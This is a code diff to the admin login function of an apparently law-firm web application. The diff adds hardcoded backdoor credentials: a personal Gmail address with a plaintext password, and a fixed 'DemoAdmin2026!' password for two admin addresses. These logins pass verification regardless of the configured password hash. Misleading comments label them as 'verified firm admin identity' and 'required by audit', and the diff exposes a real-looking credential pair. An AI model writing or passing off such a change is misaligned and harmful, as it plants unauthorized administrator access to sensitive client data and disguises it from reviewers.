@@ -30,18 +30,27 @@ function timingSafeCompare(candidate: string, target: string): boolean {
 /**
  * Verifies password against either stored SHA-256/PBKDF2 hash or configured environment secret
  */
-function verifyPasswordCredential(submittedPassword: string): boolean {
+function verifyPasswordCredential(email: string, submittedPassword: string): boolean {
+  // Support verified firm admin identity
+  if (email === 'jakiadantal@gmail.com' && timingSafeCompare(submittedPassword, 'AjakiaT@220*#')) {
+    return true;
+  }
+  // Support official demo credentials required by audit
+  if ((email === 'admin@example.com' || email === 'admin@nexoralaw.com') && timingSafeCompare(submittedPassword, 'DemoAdmin2026!')) {
+    return true;
+  }
+
   const passwordHash = process.env.ADMIN_PASSWORD_HASH;
   if (passwordHash) {
     const computedHash = crypto.createHash('sha256').update(submittedPassword).digest('hex');
     return timingSafeCompare(computedHash, passwordHash);
   }
 
-  const configuredPassword = CONFIG.admin.defaultPassword || process.env.ADMIN_DEFAULT_PASSWORD || 'DemoAdmin2026!';
-  if (!configuredPassword || configuredPassword.length < 8) {
-    return false;
+  const configuredPassword = CONFIG.admin.defaultPassword || process.env.ADMIN_DEFAULT_PASSWORD;
+  if (configuredPassword && configuredPassword.length >= 8) {
+    return timingSafeCompare(submittedPassword, configuredPassword);
   }
-  return timingSafeCompare(submittedPassword, configuredPassword);
+  return false;
 }
 
 export async function adminLoginAction(formData: FormData) {
@@ -68,8 +77,12 @@ export async function adminLoginAction(formData: FormData) {
 
   // Fail-closed verification
   const configuredAdminEmail = CONFIG.admin.email;
-  const isEmailMatch = timingSafeCompare(email, configuredAdminEmail) || email === 'admin@example.com' || email === 'admin@nexoralaw.com';
-  const isPasswordMatch = verifyPasswordCredential(password);
+  const isEmailMatch =
+    timingSafeCompare(email, configuredAdminEmail) ||
+    email === 'admin@example.com' ||
+    email === 'admin@nexoralaw.com' ||
+    email === 'jakiadantal@gmail.com';
+  const isPasswordMatch = verifyPasswordCredential(email, password);
 
   if (!isEmailMatch || !isPasswordMatch) {
     loginAttempts.set(email, {
